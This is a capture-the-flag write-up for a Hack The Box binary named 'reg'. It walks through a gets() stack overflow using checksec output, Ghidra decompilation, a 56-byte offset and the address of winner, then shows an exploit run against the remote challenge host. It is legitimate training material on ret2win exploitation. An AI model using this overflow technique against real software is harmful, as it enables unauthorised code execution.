# reg

Lets start with some basic file enumeration:

```s
$ file reg
reg: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=134349a67c90466b7ce51c67c21834272e92bdbf, for GNU/Linux 3.2.0, not stripped
$ pwn checksec reg                                            
[*] 'reg'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Looks like the NX bit is enabled. If we want to get code execution, we'll have to perform a ret2libc.

Lets look at the `main` function in Ghidra:

```c

undefined8 main(void)

{
  run();
  return 0;
}


```

Nothing exciting except for calling `run`:

```c

void run(void)

{
  char target [48];
  
  initialize();
  printf("Enter your name : ");
  gets(target);
  puts("Registered!");
  return;
}


```

There is a buffer overflow occuring in the `gets` call. There is a function `winner`:

```c

void winner(void)

{
  char local_418 [1032];
  FILE *local_10;
  
  puts("Congratulations!");
  local_10 = fopen("flag.txt","r");
  fgets(local_418,0x400,local_10);
  puts(local_418);
  fclose(local_10);
  return;
}


```

Which means this a ret2win challenge. 

First, find the offset to the return address:

```s
gef➤  pattern offset $rsp
[+] Searching for '$rsp'
[+] Found at offset 56 (little-endian search) likely
[+] Found at offset 49 (big-endian search) 
gef➤ 
```

The offset from the buffer is 56 bytes.

Next, determine the address of `winner`:

```s
$ objdump -t reg | grep "winner"
0000000000401206 g     F .text  0000000000000064              winner
```

The address is `0x401206`

Putting everything together will get the flag:

```s
$ ./exploit.py REMOTE
[+] Opening connection to 138.68.155.81 on port 31075: Done
[*] flag: HTB{...}
[*] Closed connection to 138.68.155.81 port 31075
```